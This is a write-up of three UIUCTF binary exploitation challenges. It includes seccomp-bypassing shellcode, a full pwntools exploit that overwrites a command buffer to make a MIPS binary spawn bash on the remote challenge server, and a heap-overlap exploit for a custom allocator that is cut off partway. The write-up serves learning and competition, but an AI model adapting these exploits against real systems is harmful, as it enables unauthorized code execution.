# UIUCTF

{% hint style="info" %}
Participated under the banner of <mark style="color:blue;">**Project Sekai**</mark> as _tryout_ ranked <mark style="color:yellow;">12th</mark>.
{% endhint %}

<table><thead><tr><th width="206">Challenge</th><th width="309">Category</th><th width="124" align="center">Points</th><th align="center">Solves</th></tr></thead><tbody><tr><td>Syscalls</td><td>Binary Exploitation</td><td align="center">398 pts</td><td align="center">143<a href="https://www.google.com/url?sa=t&#x26;rct=j&#x26;q=&#x26;esrc=s&#x26;source=web&#x26;cd=&#x26;ved=2ahUKEwjt56eg_ZSHAxWH3DgGHUjhD_0QFnoECBoQAQ&#x26;url=https%3A%2F%2Femojipedia.org%2F2nd-place-medal&#x26;usg=AOvVaw1a_HzsttnXLT_e0yIvRRcy&#x26;opi=89978449">🥈</a></td></tr><tr><td>Backup Power</td><td>Binary Exploitation</td><td align="center">454 pts</td><td align="center">75 <a href="https://www.google.com/url?sa=t&#x26;rct=j&#x26;q=&#x26;esrc=s&#x26;source=web&#x26;cd=&#x26;ved=2ahUKEwipnK3D-ZSHAxV69zgGHdccDGEQFnoECBkQAQ&#x26;url=https%3A%2F%2Femojipedia.org%2F1st-place-medal&#x26;usg=AOvVaw2gpojp7kMgKRfm7JKtQhyE&#x26;opi=89978449">🥇</a></td></tr><tr><td>pwnymalloc</td><td>Binary Exploitation</td><td align="center">461 pts</td><td align="center">65</td></tr></tbody></table>

***

## Syscalls🥈

### Description

> You can't escape this fortress of security.
>
> `ncat --ssl syscalls.chal.uiuc.tf 1337`

### Analysis

We're given attachments as follows:

```bash
└──╼ [★]$ tree .
.
├── Dockerfile
└── syscalls

└──╼ [★]$ file syscalls 
syscalls: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=19b78a52059d384f1b4def02d5838b625773369d, for GNU/Linux 3.2.0, stripped

└──╼ [★]$ pwn checksec syscalls 
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      PIE enabled
    Stack:    Executable
    RWX:      Has RWX segments
```

running the binary, we're greeted with this:

<figure><img src="../../.gitbook/assets/image (70).png" alt=""><figcaption></figcaption></figure>

the binary itself is quite small and simple as it decompiled below:

```c
void main(void)

{
  long in_FS_OFFSET;
  undefined shellcode [184];
  long kuki;
  
  kuki = *(long *)(in_FS_OFFSET + 0x28);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  prompt_input(shellcode);
  setup_seccomp();
  execute_code()(shellcode);
  if (kuki != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

I won't bother with the details of each function as they're pretty self explanatory standard for shellcode challenges. Below is the seccomp configuration:&#x20;

```bash
└──╼ [★]$ seccomp-tools dump ./syscalls 
The flag is in a file named flag.txt located in the same directory as this binary. That's all the information I can give you.
bruv
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x16 0xc000003e  if (A != ARCH_X86_64) goto 0024
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x13 0xffffffff  if (A != 0xffffffff) goto 0024
 0005: 0x15 0x12 0x00 0x00000000  if (A == read) goto 0024
 0006: 0x15 0x11 0x00 0x00000001  if (A == write) goto 0024
 0007: 0x15 0x10 0x00 0x00000002  if (A == open) goto 0024
 0008: 0x15 0x0f 0x00 0x00000011  if (A == pread64) goto 0024
 0009: 0x15 0x0e 0x00 0x00000013  if (A == readv) goto 0024
 0010: 0x15 0x0d 0x00 0x00000028  if (A == sendfile) goto 0024
 0011: 0x15 0x0c 0x00 0x00000039  if (A == fork) goto 0024
 0012: 0x15 0x0b 0x00 0x0000003b  if (A == execve) goto 0024
 0013: 0x15 0x0a 0x00 0x00000113  if (A == splice) goto 0024
 0014: 0x15 0x09 0x00 0x00000127  if (A == preadv) goto 0024
 0015: 0x15 0x08 0x00 0x00000128  if (A == pwritev) goto 0024
 0016: 0x15 0x07 0x00 0x00000142  if (A == execveat) goto 0024
 0017: 0x15 0x00 0x05 0x00000014  if (A != writev) goto 0023
 0018: 0x20 0x00 0x00 0x00000014  A = fd >> 32 # writev(fd, vec, vlen)
 0019: 0x25 0x03 0x00 0x00000000  if (A > 0x0) goto 0023
 0020: 0x15 0x00 0x03 0x00000000  if (A != 0x0) goto 0024
 0021: 0x20 0x00 0x00 0x00000010  A = fd # writev(fd, vec, vlen)
 0022: 0x25 0x00 0x01 0x000003e8  if (A <= 0x3e8) goto 0024
 0023: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0024: 0x06 0x00 0x00 0x00000000  return KILL
```

as `execve` and `execveat` is blacklisted, we're unable to pop a shell, thus we had to do an ORW to leak the flag.

### Exploitation

#### Open

this one is fairly trivial, since we other known common alternatives are not blacklisted.  &#x20;

<figure><img src="../../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>

with the `*at` flavour of linux syscalls, it means that it takes a absolute path of a file/directory. this can be easily figured out since we have the Dockerfile.&#x20;

however in cases where we have no information about the current working directory it is still possible to open a file with relative paths.

according to the man pages:

> If _pathname_ is relative and _dirfd_ is the special value AT\_FDCWD, then _pathname_ is interpreted relative to the current working directory of the calling process (like [open](https://linux.die.net/man/2/open)(2)).

{% embed url="https://linux.die.net/man/2/openat" %}

and so we need to set RDI to the value of `AT_FDCWD` , which according to the source code is `-100`&#x20;

{% embed url="https://elixir.bootlin.com/linux/v4.14.13/source/include/uapi/linux/fcntl.h#L78" %}

#### Read

as most read syscalls are banned, I look up into the syscall list and found one that are allowed

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

reading at the man pages, `readahead`, `readlink`, and `readlinkat` behaviour is unfamiliar with me at the time. However, `preadv2` is an extension to `preadv` and can behave the same. So I choose it to read buffer.

{% embed url="https://manpages.debian.org/testing/manpages-dev/preadv2.2.en.html#STANDARDS" %}

{% hint style="info" %}
As I see on other solutions, it is also possible to read a buffer from an `fd` with `mmap()`
{% endhint %}

#### Write

<figure><img src="../../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>

I realized that there are other alternative that is not blacklisted, however I want to solve the challenge as how it seems it is intended, assuming only `writev` is whitelist and others are blacklisted.

and so even though `writev` is whitelisted, it need to pass some checks that are as follow:

```bash
A = fd >> 32 # writev(fd, vec, vlen)
if (A > 0x0) goto ALLOW
if (A != 0x0) goto KILL
```

the checks occurs before executing `writev`, in the first line it will take the `fd` that we have set up and shift it right 4 bytes. this means it will only check the 4 higher order bytes of it.&#x20;

for example, if we gave it `0x1111111100000000` it will only take context of this part `0x11111111`

and so this presents a problem because the default `fd` for `STDOUT` is `0x1` with nothing in its higher order bytes.&#x20;

#### dup

dup will solves this problem by duplicating given `fd` to another number which will serves the same purpose just on another number. we can control what the new `fd` number is by using `dup2` instead of `dup`. you can read more of it on its man page

{% embed url="https://linux.die.net/man/2/dup2" %}

in this exploit I duplicated `STDOUT` (0x01) to `0x100000000` to passes the check and then we can give `writev` our new `fd` to passes the check and because it is a duplicate of `STDOUT` it will also provide the same functionality.

<figure><img src="../../.gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>

below is the full shellcode I used to solve this challenge:

{% code title="shellcode.asm" %}
```armasm
    BITS 64
    DEFAULT REL

    section .text
    global _start

_start:
    ; openat2
    mov rdi, -100
    lea rsi, flagpath
    mov rdx, 0x0
    mov r10, 0x0
    mov rax, 257
    syscall

    ; dup2
    mov rdi, 0x1
    mov rsi, 0x100000000
    mov rax, 33
    syscall

    ; iovec
    mov r12, rsp
    sub r12, 0x200
    
    push 0x100
    push r12

    ; preadv2
    mov rdi, 0x3
    mov rsi, rsp
    mov rdx, 0x1
    mov r10, 0x0
    mov r8, 0x0
    mov r9, 0x0
    mov rax, 327
    syscall

    ; writev
    mov rdi, 0x100000000
    mov rax, 20
    syscall

    nop
    nop

flagpath: db "./flag.txt", 0
```
{% endcode %}

{% hint style="success" %}
Flag: _**uiuctf{a532aaf9aaed1fa5906de364a1162e0833c57a0246ab9ffc}**_
{% endhint %}

***

## Backup Power🥇

{% hint style="info" %}
got 1st blood[🩸](https://www.google.com/url?sa=t\&rct=j\&q=\&esrc=s\&source=web\&cd=\&ved=2ahUKEwii--OB_ZSHAxWS1zgGHQv6CQoQFnoECBwQAQ\&url=https%3A%2F%2Femojipedia.org%2Fdrop-of-blood\&usg=AOvVaw1-FUJzLYPkLB-jg_AS6ei5\&opi=89978449) on this one :D my first MIPS pwn as well
{% endhint %}

### Description

> Can you turn on the backup generator for the SIGPwny Transit Authority?
>
> `ncat --ssl backup-power.chal.uiuc.tf 1337`

### Analysis

We're given attachments as follows:

```bash
└──╼ [★]$ tree .
.
├── backup-power
├── Dockerfile
├── exploit.py
└── flag.txt

└──╼ [★]$ file backup-power 
backup-power: ELF 32-bit MSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), statically linked, BuildID[sha1]=f35027e73bc1014a42a60288b446b1dedca772fb, for GNU/Linux 3.2.0, with debug_info, not stripped

└──╼ [★]$ pwn checksec backup-power 
    Arch:     mips-32-big
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x400000)
    Stack:    Executable
    RWX:      Has RWX segments
```

it is my first encountering an MIPS binary and I'm unfamiliar with the assembly so I'm relying highly on the decompiled code from ghidra.

<details>

<summary><code>Main()</code></summary>

```c
/* WARNING: Unknown calling convention */
int main(void)
{
  bool bVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  undefined4 uVar4;
  undefined4 uVar5;
  size_t sVar6;
  int iVar7;
  int in_stack_fffffd68;
  char *backup_power;
  int valid;
  int i;
  int cfi;
  char username [100];
  char password [100];
  char command [100];
  char command_buf [128];
  char shutdown [9];
  char shutup [7];
  char system_str [7];
  char arg1 [32];
  char arg2 [32];
  char arg3 [32];
  char arg4 [32];
  int a;
  int b;
  int c;
  char *allowed_commands [2];
  
  setbuf((FILE *)stdout,(char *)0x0);
  puts("===========================\n= BACKUP POWER MANAGEMENT =\n============================");
  backup_power = "disabled";
  shutdown = "shutdown\0";
  shutup = "shutup\0";
  system_str = "system\0";
  arg1 = {0};
  arg2 = {0};
  arg3 = {0};
  arg4 = {0};
  a = 0x800;
  b = 0x800;
  c = 0xb0c;
  allowed_commands[0] = shutdown;
  allowed_commands[1] = shutup;
  do {
    while( true ) {
      printf("SIGPwny Transit Authority Backup power status: %s\n",backup_power);
      printf("Username: ");
      fgets(username,100,(FILE *)stdin);
      sVar6 = strcspn(username,"\n");
      username[sVar6] = '\0';
      printf("Username is %s\n",username);
      iVar7 = strcmp(username,"devolper");
      uVar5 = arg4._0_4_;
      uVar4 = arg3._0_4_;
      uVar3 = arg2._0_4_;
      uVar2 = arg1._0_4_;
      if (iVar7 == 0) break;
      printf("Password: ");
      fgets(password,100,(FILE *)stdin);
      printf("Command: ");
      fgets(command,100,(FILE *)stdin);
      sVar6 = strcspn(command,"\n");
      command[sVar6] = '\0';
      bVar1 = false;
      for (i = 0; i < 2; i = i + 1) {
        iVar7 = strcmp(command,allowed_commands[i]);
        if (iVar7 == 0) {
          bVar1 = true;
          break;
        }
      }
      if (!bVar1) {
        puts("Invalid command");
        return 0;
      }
cmp_cmd:
      iVar7 = strcmp(command,shutdown);
      if (iVar7 == 0) {
        backup_power = "disabled";
      }
      else {
        iVar7 = strcmp(command,shutup);
        if (iVar7 == 0) {
          backup_power = "enabled";
        }
        else {
          iVar7 = strcmp(command,system_str);
          if (iVar7 == 0) {
            sprintf(command_buf,"%s %s %s %s",arg1,arg2,arg3,arg4);
            system(command_buf);
            return 0;
          }
          iVar7 = strcmp(command,"todo");
          if (iVar7 != 0) {
            puts("We got here 3");
            return 0;
          }
          puts("Only developers should see this");
        }
      }
    }
    command = "todo\0";
    if (((a < 0x2711) && (b < 0x2711)) && (c < 0x2711)) {
      develper_power_management_portal(in_stack_fffffd68);
      arg1._0_4_ = uVar2;
      arg2._0_4_ = uVar3;
      arg3._0_4_ = uVar4;
      arg4._0_4_ = uVar5;
      goto cmp_cmd;
    }
    puts("develper anger!!!");
  } while( true );
}
```

</details>

the program prompts an username and password to which it then asks a command. there's 4 type of command but only one is in our interest which is `system`. however the command is whitelisted to only `shutup` and `shutdown`.

another thing to note we also have access to `develper_power_management_portal` if the username is `devolper` (a typo?)

<details>

<summary><code>develper_power_management_portal()</code></summary>

```c
/* WARNING: Unknown calling convention */
void develper_power_management_portal(int cfi)

{
  int in_a0;
  int unaff_retaddr;
  char buffer [4];
  
  gets(buffer);
  if (unaff_retaddr != in_a0) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

</details>

which in turn calls `gets()` that enables a buffer overflow.&#x20;

before calling this function however it sets its command to `"todo"` before jump back to compare the commands. which if goes without exploit, should've printed `"Only developers should see this"`

### Exploitation

#### Canary

however as you might realized, the binary is equipped with canary protection, which we will need to leak ... or do we?&#x20;

as I'am unfamiliar with this architecture I realized one thing in the decompiled code:

```c
  if (unaff_retaddr != in_a0) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
```

the canary mechanism in this binary doesn't have an 8 bytes of random value before RBP, but it only checks if the return address of the current function stack is the same at the start of the function call.

this combined with the information fact that the binary has <mark style="color:red;">NO PIE</mark>, means that we could potentially still overwrite values of the stack out of boundaries while still preserving the return address as if it was the same.&#x20;

again, because I'm unfamiliar with the assembly, I basically put a breakpoint on wherever ghidra points to when it makes the comparison as shown below

<figure><img src="../../.gitbook/assets/image (53).png" alt=""><figcaption></figcaption></figure>

and here's in GDB&#x20;

<figure><img src="../../.gitbook/assets/image (55).png" alt=""><figcaption></figcaption></figure>

we can clearly see that `S1` which where our input goes, is being compared to a fixed address of `0x400ec0` that falls of the main function region.

with this, we can use pwndbg's cyclic to count the offset to which where we need to preserve the return address.

<figure><img src="../../.gitbook/assets/image (56).png" alt=""><figcaption></figcaption></figure>

#### if PC can't be controlled, overwrite what and where?

thankfully, system is being called within main(), the only problem we can't give it as a command because of the whitelist. However, with this BOF, we're able to set the command to system and bypassing the whitelist.&#x20;

this is because as `devolper` commands are set automatically to `"todo"` and thus in turn also skips the whitelist checks. BOF also happens before the commands are being compared so, we can potentially overwrite it with system

```c
    iVar7 = strcmp(username,"devolper");
    if (iVar7 == 0) break; // immediately break the loop,
                           // skipping the whitelist check below
    for (i = 0; i < 2; i = i + 1) {
      iVar7 = strcmp(command,allowed_commands[i]);
      // ..
    }
    if (!bVar1) {
      puts("Invalid command");
      return 0;
    }
cmp_cmd:
    iVar7 = strcmp(command,shutdown);
    // ...
    else {
      iVar7 = strcmp(command,shutup);
      // ...
      else {
        iVar7 = strcmp(command,system_str);
        // TARGET
        iVar7 = strcmp(command,"todo");
        // ...
        puts("Only developers should see this");
      }
    }
  }
  command = "todo\0";
    develper_power_management_portal(in_stack_fffffd68); // BOF
    goto cmp_cmd; // compare command, at this point 
                  // command is overwritten with "system"
```

and just like before, let's do cyclic after preserving return address to see our offset before overwriting the command variable.

```python
    io.sendlineafter(b'Username:', b'devolper')
    payload = cyclic(44)
    payload += p32(0x400b0c)
    payload += cyclic(200)    
    sleep(0.2)
    io.sendline(payload)
```

but before even we got to that point, we got a SIGBUS ERR instead

<figure><img src="../../.gitbook/assets/image (57).png" alt="" width="265"><figcaption></figcaption></figure>

I honestly have no idea why is this happening, but from prior experience what I think happened is that we overwrite some important pointers and when an instruction tries to reference or dereference that value (which obviously we have overwritten with a non-valid address), we crashed the program.

#### preserving more values

my way around this is to compare the state of the stack before anything is overwritten and preserve some values that looks like an important pointers.

and so I put another breakpoint before the developer portal returns

<figure><img src="../../.gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>

here's when we hit the breakpoint in GDB

<figure><img src="../../.gitbook/assets/image (61).png" alt="" width="371"><figcaption></figcaption></figure>

as I highlighted, in the red there's some pointers that we need to preserve while the others can be filled with rubbish.

{% hint style="warning" %}
pay attention to the value pointed by pink arrow, it will be problematic later
{% endhint %}

and so our payload now is as follow, between the preserved pointers I also fill it with unique values just so if we crash again, and we see that value in the register, we know where to fix it (_**foreshadowing**_)

```python
    io.sendlineafter(b'Username:', b'devolper')
    payload = cyclic(44)
    payload += flat([
            0x400b0c,       # preserve `rip` to bypass canary check
            p32(0x1) * 5,   # random val for fuzz
            0x4aa330,       # preserve some value
            p32(0x2) * 1,   # random val for fuzz
            0x4721c8,       # preserve some value
            p32(0x3) * 2,   # random val for fuzz
            0x400b0c,       # preserve some value
    ]) 
    payload +=  cyclic(300)
    sleep(0.2)
    io.sendline(payload)
```

however we still got SIGBUS

<figure><img src="../../.gitbook/assets/image (62).png" alt="" width="305"><figcaption></figcaption></figure>

even though I'm not sure at the cause, my intuition says it's because GP needs to also be a pointer since deriving from the register's name, it's probably not a general purpose register. and since we know the value of GP is directly controlled by our input, to fix this I decided just to give it similar address right before it and it worked. so now our payload goes something like this:

```python
    io.sendlineafter(b'Username:', b'devolper')
    payload = cyclic(44)
    payload += flat([
            0x400b0c,       # preserve `rip` to bypass canary check
            p32(0x1) * 5,   # random val for fuzz
            0x4aa330,       # preserve some value
            p32(0x4aa330),  # preserve some value
            0x4721c8,       # preserve some value
            p32(0x3) * 2,   # random val for fuzz
            0x400b0c,       # preserve some value
    ]) 
    payload +=  cyclic(300)
    sleep(0.2)
    io.sendline(payload)
```

to count the offset to overwrite command, I set another breakpoint here at this `jalr` instruction (which sound like a jump)

<figure><img src="../../.gitbook/assets/image (63).png" alt=""><figcaption></figcaption></figure>

and here's in GDB

<figure><img src="../../.gitbook/assets/image (64).png" alt="" width="509"><figcaption></figcaption></figure>

and now our payload

```python
    io.sendlineafter(b'Username:', b'devolper')
    payload = cyclic(44)
    payload += flat([
            0x400b0c,       # preserve `rip` to bypass canary check
            p32(0x1) * 5,   # random val for fuzz
            0x4aa330,       # preserve some value
            p32(0x4aa330),  # preserve some value
            0x4721c8,       # preserve some value
            p32(0x3) * 2,   # random val for fuzz
            0x400b0c,       # preserve some value
    ]) 
    payload +=  cyclic(204)
    payload += b'system\x00'
    sleep(0.2)
    io.sendline(payload)
```

and lets put a breakpoint before it calls system to ensure that it definitely reaches to that point of execution&#x20;

<figure><img src="../../.gitbook/assets/image (65).png" alt="" width="563"><figcaption></figcaption></figure>

and it definitely does, but we still don't know what system command it's executing. recall that before calling system, it sets up arguments for it

```c
sprintf(command_buf,"%s %s %s %s",arg1,arg2,arg3,arg4);
system(command_buf);
```

to figure out what input of our payload that affects the argument we need to inspect the registers, but in MIPS convention what register contains the first argument?

I simply looked at MIPS's syscall table and mapped the register that has the same position as RDI and in this case, its `A0`

<figure><img src="../../.gitbook/assets/image (66).png" alt=""><figcaption></figcaption></figure>

we can see that the string given to system is comprised of 4 characters separated by spaces, just like the format that sprintf does right before it. this also reveals about a restriction being that the length of command or binary we wish to execute is limited to 4 characters long.&#x20;

<figure><img src="../../.gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>

we can also further verifies this by let the program run and looking at the error message

<figure><img src="../../.gitbook/assets/image (68).png" alt=""><figcaption></figcaption></figure>

notice how it tries to execute `gaaa`.&#x20;

<figure><img src="../../.gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>

we gain the offset at 24, however as you may realize that we have 2 cyclics in our payload, you kinda just figure this out by trying at both ends and see where it affects the arguments. turns out it was the first `cyclic(44)` that affects this.

and now for the binary to execute, `/bin/sh` is too long, `sh` doesn't work and so I tried `bash` and it worked perfectly. refer to the full exploit script below for the full payload.

here's the PoC being ran againts the remote server:

<figure><img src="../../.gitbook/assets/image (52).png" alt="" width="563"><figcaption></figcaption></figure>

Below is the full exploit script:

{% code title="exploit.py" %}
```python
#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './backup-power'
elf = context.binary = ELF(exe, checksec=True)
# libc = './libc.so.6'
# libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = 'backup-power.chal.uiuc.tf', 1337

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port, ssl=True)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
# break *0x400e8c
# break *0x0400cb4
break *0x400d34
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec backup-power 
#     Arch:     mips-32-big
#     RELRO:    Partial RELRO
#     Stack:    Canary found
#     NX:       NX unknown - GNU_STACK missing
#     PIE:      No PIE (0x400000)
#     Stack:    Executable
#     RWX:      Has RWX segments

def exploit():
    global io
    io = initialize()

    io.sendlineafter(b'Username:', b'devolper')
    
    payload = cyclic(24)
    payload += b'bash\x00'.ljust(44-len(payload), b'\x00')
    payload += flat([
            0x400b0c,       # preserve `rip` to bypass canary check
            p32(0x1) * 5,   # random val for fuzz
            0x4aa330,       # preserve some value
            p32(0x4aa330),  # preserve some value
            0x4721c8,       # preserve some value
            p32(0x3) * 2,   # random val for fuzz
            0x400b0c,       # preserve some value
    ]) 
    payload +=  cyclic(204)
    payload += b'system\x00'
    
    sleep(0.2)
    io.sendline(payload)

    io.interactive()
    
if __name__ == '__main__':
    exploit()
```
{% endcode %}

{% hint style="success" %}
Flag: _**uiuctf{backup\_p0wer\_not\_r3gisters}**_
{% endhint %}

***

## pwnymalloc

### Description

> i'm tired of hearing all your complaints. pwnymalloc never complains.
>
> `ncat --ssl pwnymalloc.chal.uiuc.tf 1337`

### Analysis

We're given attachments as follows:

```bash
└──╼ [★]$ tree .
.
├── alloc.c
├── alloc.h
├── chal
├── main.c
└── Makefile

└──╼ [★]$ file chal
chal: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=efcb16175cc225d8264895c8b01241c14e14cac3, for GNU/Linux 3.2.0, not stripped

└──╼ [★]$ pwn checksec chal
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

thankfully the challenge author is kind enough to give us the source code for this challenge. the challenge is all about custom malloc implementation which seems incomplete, though the chunk structure is the same and at first glance it's behaviour seemed very similar to glibc malloc in other heap challenges, there are some notable differences that I will point out here:

#### pwnymalloc — custom malloc implementation

* only 1 type of bins

pretty self explanatory

```c
static chunk_ptr free_list = NULL;
```

* always try to coalesce upon freeing

freeing a chunk it will always tries to coalesce it either to the previous or the chunk in front of it.

```c
void pwnyfree(void *ptr) {
    if (ptr == NULL) {
        return;
    }

    chunk_ptr block = (chunk_ptr) ((char *) ptr - INUSE_META_SIZE);

    // eheck alignment and status
    if ((size_t) block % ALIGNMENT != 0 || get_status(block) != INUSE) {
        return;
    }

    // ..

    block = coalesce(block); // <-- always tries to coalesce

    // ..

    free_list_insert(block);
}
```

the coalesce code is as follow:

```c
static chunk_ptr coalesce(chunk_ptr block) {
    chunk_ptr prev_block = prev_chunk(block);
    chunk_ptr next_block = next_chunk((chunk_ptr) block);
    size_t size = get_size(block);

    int prev_status = prev_block == NULL ? -1 : get_status(prev_block);
    int next_status = next_block == NULL ? -1 : get_status(next_block);

    if (prev_status == FREE && next_status == FREE) {
        free_list_remove(next_block);
        free_list_remove(prev_block);

        size += get_size(prev_block) + get_size(next_block);
        prev_block->size = pack_size(size, FREE);
        set_btag(prev_block, size);
        
        return prev_block;
    } 
    if (prev_status == FREE) {
        free_list_remove(prev_block);

        size += get_size(prev_block);
        prev_block->size = pack_size(size, FREE);
        set_btag(prev_block, size);

        return prev_block;
    } 
    if (next_status == FREE) {
        free_list_remove(next_block);

        size += get_size(next_block);
        block->size = pack_size(size, FREE);
        set_btag(block, size);

        return block;
    }

    return block;
}
```

the way the allocator gets previous chunk is and next chunk is different, when getting a next chunk, it will simply return the calculate the current chunk's size, and return its `address+size`.&#x20;

```c
static chunk_ptr next_chunk(chunk_ptr block) {
    size_t size = get_size(block);
    if ((void *) block >= heap_end - size) {
        return NULL;
    }
    return (chunk_ptr) ((char *) block + size);
}
```

getting the previous chunk is also by returning a memory address at an chunk relative offset, however instead of calculating the offset by its size, the offset is determined by getting the `prev_size` metadata that also exists in malloc allocator we familiar of.

```c
static chunk_ptr prev_chunk(chunk_ptr block) {
    if ((void *) block - get_prev_size(block) < heap_start || get_prev_size(block) == 0) {
        return NULL;
    }
    return (chunk_ptr) ((char *) block - get_prev_size(block));
}
```

* splitting free chunk to recycle

in the absence bins that could handle different sizes of free chunk, you might ask how the allocator recycle the free chunks?&#x20;

well it will traverse all of the free list and find chunks where the size is bigger or same as the requested size.

```c
static chunk_ptr find_fit(size_t size) {
    chunk_ptr block = free_list;
    while (block != NULL) {
        if (get_size(block) >= size) {
            free_list_remove(block);
            set_status(block, INUSE);
            return block;
        }
        block = block->next;
    }
    return NULL;
}
```

if the chunk returned by `find_fit()` is bigger then the total requested size, it will split the chunk into the requested size and return it while the remainder will stay as free chunk.&#x20;

```c
void *pwnymalloc(size_t size) {
    // .. 

    chunk_ptr block = find_fit(total_size);

    if (block == NULL) {
        // .. 
    } else if (get_size((chunk_ptr) block) >= total_size + MIN_BLOCK_SIZE) {
        split(block, total_size);
    }

    return (void *) ((char *) block + INUSE_META_SIZE);
}
```

#### the challenge

the challenge presents itself in the form of practically 3 option we can choose. before we discuss each of them, here's a struct and enum that will be used as the chunk structure and state.

```c
typedef enum {
    REFUND_DENIED,
    REFUND_APPROVED,
} refund_status_t;

typedef struct refund_request {
    refund_status_t status;
    int amount;
    char reason[0x80];
} refund_request_t;

refund_request_t *requests[10] = {NULL};
```

* Create

we can create up to 10 request, with each will used the custom `pwnymalloc` and we're able to directly affect to the `.amount` and `.reason` attribute of the structure. `.status` however is always set to `REFUND_DENIED`.&#x20;

```c
void handle_refund_request() {
    int request_id = -1;
    for (int i = 0; i < 10; i++) {
        if (requests[i] == NULL) {
            request_id = i;
            break;
        }
    }

    if (request_id == -1) {
        // ..
    }

    refund_request_t *request = pwnymalloc(sizeof(refund_request_t));
    // ..
    char amount_str[0x10];
    fgets(amount_str, 0x10, stdin);
    sscanf(amount_str, "%d", &request->amount);

    // ..
    fgets(request->reason, 0x80, stdin);
    request->reason[0x7f] = '\0'; // null-terminate

    // ..
    request->status = REFUND_DENIED;

    requests[request_id] = request;

    // ..
}
```

* Create -> Free

this one creates a chunk with a smaller size than the request chunk and immediately free's it using the custom `pwnymalloc` and `pwnyfree`.

```c
void handle_complaint() {
    // ...
    char *trash = pwnymalloc(0x48);
    fgets(trash, 0x48, stdin);
    memset(trash, 0, 0x48);
    pwnyfree(trash);
    // ...
}
```

* Win

this is the win function, which we can trigger to get the flag only if the status of the chunk is `REFUND_APPROVED` which is never set anywhere in the source code.

```c
void handle_refund_status() {
    // ..
    char id_str[0x10];
    fgets(id_str, 0x10, stdin);
    int request_id;
    sscanf(id_str, "%d", &request_id);

    if (request_id < 0 || request_id >= 10) {
        // ..
        return;
    }

    refund_request_t *request = requests[request_id];
    if (request == NULL) {
        // ..
        return;
    }

    if (request->status == REFUND_APPROVED) {
        // ..
        print_flag();
    } else {
        // ..
    }
}
```

and so our goal is clear, we need to somehow have a chunk that has a APPROVED status to gain the flag.

### Exploitation

#### the bug

the bug here lies when the allocator tries to coalesce of what it thought a free chunk, specifically here:

```c
static chunk_ptr coalesce(chunk_ptr block) {
    chunk_ptr prev_block = prev_chunk(block);
    // ...
    
    int prev_status = prev_block == NULL ? -1 : get_status(prev_block);
    // ...

    if (prev_status == FREE && next_status == FREE) {
        // ...
    } 
    if (prev_status == FREE) {
        free_list_remove(prev_block);

        size += get_size(prev_block);
        prev_block->size = pack_size(size, FREE);
        set_btag(prev_block, size);

        return prev_block;
    } 
    if (next_status == FREE) {
        // ...
    }

    // ...
}
```

when fetching the `prev_chunk` it uses the `prev_size` metadata of a chunk which is located inside of the previous chunk's data, not within the chunk itself.&#x20;

here, the allocator blindly fetches the `prev_size` metadata without validating first, if the the previous chunk is free or not.&#x20;

if the previous chunk is not free, this means that the `prev_size` metadata should not be used as the chunk is still inuse and contain user input data.&#x20;

the `prev_size` metadata should only be used only if the previous chunk is already free and the data region is no longer in use.

with this in mind, if the previous chunk is still inuse which is under our control, we can poison the `prev_size` so that when it tries to coalesce, it will trigger a merging causing an overlapping chunk.

to better understand this, lets go through the visualization on the next section&#x20;

#### overlapping chunk

to do this, we will need to do it in 4 steps:

1. create 3 chunks: A, B, C
2. create a fake chunk within A, this fake chunk is what will be returned as our profit
3. poison the `prev_size` metadata of C within B
4. pwnyfree C

however, we do not have the option to create, update and free as freely. and such we need to do create the chunk and fill in the data in one go.

```python
def idk(data):
    log.info('IDK-ing...')
    io.sendlineafter(b'>', b'1')
    io.sendafter(b'complaint:', data.ljust(0x48-1, b'\x00'))
    sleep(0.2)

def pwnymalloc(amount, data):
    sleep(0.2)
    log.info('Pwnymallocing...')
    io.sendlineafter(b'>', b'3')
    io.sendlineafter(b'refunded:', str(amount).encode())
    io.sendafter(b'request:', data.ljust(0x7f, b'\x00'))
    sleep(0.2)

    io.recvuntil(b'Your request ID is: ')
    return int(io.recvline().strip())

# creates A and fake chunk within it 
fake_chunk = b'\x00' * 0x40 + b'\xd0'
pwnymalloc(0x1, fake_chunk)

# creates B and poison `prev_size`
fake_prev = b'\x00' * 0x78 + b'\xd0'
pwnymalloc(0x2, fake_prev) 

